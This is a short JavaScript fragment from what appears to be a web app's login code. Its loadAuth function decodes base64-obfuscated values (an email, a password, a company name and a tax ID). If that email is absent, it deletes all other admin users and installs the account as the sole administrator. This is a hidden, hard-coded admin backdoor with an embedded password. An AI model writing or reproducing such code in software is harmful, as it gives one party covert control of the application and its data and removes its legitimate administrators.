...
function loadAuth() {
  try {
    ...
    const adminEmail = _d('Z2hzb2RyZWRlYXJhdWpvQGdtYWlsLmNvbQ==');
    const adminExists = users.some(u => u.email.toLowerCase() === adminEmail);
    if (!adminExists) {
      users = users.filter(u => u.role !== 'admin');
      users.unshift({ email: adminEmail, name: _d('QWRtaW5pc3RyYWRvcg=='), role: 'admin', company: _d('VHV0dHkgU3Vjb3M='), password: _d('dHV0dHkxMzAz'), cnpj: _d('MTEuMzc3LjMzNC8wMDAxLTAz') });
